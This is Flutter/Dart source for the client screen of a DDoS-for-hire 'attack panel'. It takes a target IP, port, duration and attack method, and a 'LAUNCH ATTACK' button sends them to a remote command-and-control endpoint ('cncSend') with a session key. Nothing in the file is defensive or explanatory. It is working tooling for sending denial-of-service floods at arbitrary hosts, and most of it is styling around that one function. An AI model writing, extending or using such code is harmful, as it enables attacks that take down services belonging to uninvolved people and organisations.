// ddos_panel.dart
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'config.dart';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final String baseUrl = "$apiBaseUrl";
  late AnimationController _controller;
  String selectedDoosId = "";
  double attackDuration = 60;

  // --- MODERN PURPLE THEME ---
  static const Color bgDark = Color(0xFF050510); // Latar belakang gelap keunguan
  static const Color accentPurple = Color(0xFFBB86FC); // Ungu terang utama
  static const Color darkPurple = Color(0xFF1A1025); // Ungu gelap untuk kartu
  static const Color primaryWhite = Color(0xFFFFFFFF);
  static const Color softGrey = Color(0xFFB0B0B0);

  LinearGradient get purpleGradient => const LinearGradient(
        colors: [Color(0xFF6A1B9A), Color(0xFFAB47BC)],
        begin: Alignment.topLeft,
        end: Alignment.bottomRight,
      );

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }
  }

  Future<void> _sendDoos() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty || key.isEmpty) {
      _showAlert("❌ Invalid Input", "Target IP cannot be empty.");
      return;
    }

    if (selectedDoosId != "icmp" && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("❌ Invalid Port", "Please input a valid port.");
      return;
    }

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Please wait a moment before sending again.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Invalid Key", "Your session key is invalid. Please log in again.");
      } else if (data["sended"] == false) {
        _showAlert("⚠️ Failed", "Failed to send attack. The server may be under maintenance.");
      } else {
        _showAlert("✅ Success", "Attack has been successfully sent to $target.");
      }
    } catch (_) {
      _showAlert("❌ Error", "An unexpected error occurred. Please try again.");
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: darkPurple,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: accentPurple.withOpacity(0.5), width: 1.5)
        ),
        title: Text(title, style: TextStyle(color: primaryWhite, fontFamily: 'Orbitron')),
        content: Text(msg, style: TextStyle(color: primaryWhite.withOpacity(0.7), fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK", style: TextStyle(color: accentPurple)),
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        centerTitle: true,
        title: Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          decoration: BoxDecoration(
            gradient: purpleGradient,
            borderRadius: BorderRadius.circular(24),
            boxShadow: [
              BoxShadow(
                color: accentPurple.withOpacity(0.3),
                blurRadius: 10,
              ),
            ],
          ),
          child: const Text(
            "🚀 ATTACK PANEL",
            style: TextStyle(
              fontFamily: 'Orbitron',
              fontWeight: FontWeight.bold,
              color: primaryWhite,
              fontSize: 14,
              letterSpacing: 1,
            ),
          ),
        ),
        leading: IconButton(
          icon: Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: accentPurple.withOpacity(0.1),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: primaryWhite.withOpacity(0.08)),
            ),
            child: const Icon(Icons.arrow_back_ios_new, color: accentPurple, size: 18),
          ),
          onPressed: () => Navigator.pop(context),
        ),
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            children: [
              FadeTransition(
                opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
                child: Container(
                  padding: const EdgeInsets.all(4), 
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    gradient: purpleGradient,
                    boxShadow: [
                      BoxShadow(
                        color: accentPurple.withOpacity(0.5),
                        blurRadius: 20,
                        spreadRadius: 2,
                      )
                    ]
                  ),
                  child: CircleAvatar(
                    radius: 60,
                    backgroundColor: bgDark,
                    child: Image.asset(
                      'assets/images/logo.png',
                      width: 100,
                      height: 100,
                      fit: BoxFit.cover,
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 20),
              Text(
                "Target Input & Methods",
                style: TextStyle(
                  color: primaryWhite,
                  fontFamily: 'Orbitron',
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                ),
              ),
              Divider(color: accentPurple.withOpacity(0.3), thickness: 0.6),
              const SizedBox(height: 25),

              _buildInputCard(
                icon: Icons.computer,
                title: "Target IP",
                child: TextField(
                  controller: targetController,
                  style: TextStyle(color: primaryWhite),
                  cursorColor: accentPurple,
                  decoration: _inputStyle("Target IP (e.g. 1.1.1.1)"),
                ),
              ),
              const SizedBox(height: 20),

              _buildInputCard(
                icon: Icons.wifi_tethering,
                title: "Port",
                child: TextField(
                  controller: portController,
                  enabled: !isIcmp,
                  keyboardType: TextInputType.number,
                  style: TextStyle(color: isIcmp ? Colors.grey : primaryWhite),
                  cursorColor: isIcmp ? Colors.grey : accentPurple,
                  decoration: _inputStyle(
                    isIcmp ? "ICMP does not use port" : "Port (e.g. 80)",
                    isIcmp: isIcmp,
                  ),
                ),
              ),
              const SizedBox(height: 20),

              _buildInputCard(
                icon: Icons.timer,
                title: "Attack Duration",
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text("⏱ ${attackDuration.toInt()} seconds",
                        style: TextStyle(color: primaryWhite.withOpacity(0.7), fontSize: 14)),
                    Slider(
                      value: attackDuration,
                      min: 10,
                      max: 300,
                      divisions: 29,
                      label: "${attackDuration.toInt()}s",
                      activeColor: accentPurple,
                      inactiveColor: primaryWhite.withOpacity(0.1),
                      onChanged: (value) {
                        setState(() => attackDuration = value);
                      },
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 20),

              _buildInputCard(
                icon: Icons.flash_on,
                title: "Attack Method",
                child: DropdownButtonHideUnderline(
                  child: DropdownButton<String>(
                    dropdownColor: darkPurple,
                    value: selectedDoosId,
                    isExpanded: true,
                    iconEnabledColor: accentPurple,
                    style: TextStyle(color: primaryWhite),
                    items: widget.listDoos.map((doos) {
                      return DropdownMenuItem<String>(
                        value: doos['ddos_id'],
                        child: Text(
                          doos['ddos_name'],
                          style: TextStyle(color: primaryWhite),
                        ),
                      );
                    }).toList(),
                    onChanged: (value) {
                      setState(() {
                        selectedDoosId = value!;
                      });
                    },
                  ),
                ),
              ),
              const SizedBox(height: 40),

              SizedBox(
                width: double.infinity,
                child: GestureDetector(
                  onTap: _sendDoos,
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(
                      gradient: purpleGradient,
                      borderRadius: BorderRadius.circular(16),
                      boxShadow: [
                        BoxShadow(
                          color: accentPurple.withOpacity(0.4),
                          blurRadius: 10,
                          spreadRadius: 1,
                        )
                      ],
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.bolt, color: primaryWhite, size: 22),
                        const SizedBox(width: 10),
                        Text(
                          "LAUNCH ATTACK",
                          style: TextStyle(
                            fontSize: 16,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1.2,
                            color: primaryWhite,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: darkPurple,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: accentPurple.withOpacity(0.3), width: 1),
        boxShadow: [
          BoxShadow(
            color: accentPurple.withOpacity(0.1),
            blurRadius: 8,
            spreadRadius: 1,
          )
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon, color: accentPurple, size: 20),
              const SizedBox(width: 8),
              Text(title,
                  style: TextStyle(color: primaryWhite, fontWeight: FontWeight.bold)),
            ],
          ),
          const SizedBox(height: 10),
          child,
        ],
      ),
    );
  }

  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(color: isIcmp ? Colors.grey : softGrey),
      filled: true,
      fillColor: bgDark,
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      enabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? Colors.grey : accentPurple.withOpacity(0.5)),
        borderRadius: BorderRadius.circular(16),
      ),
      focusedBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? Colors.grey : accentPurple, width: 1.5),
        borderRadius: BorderRadius.circular(16),
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }
}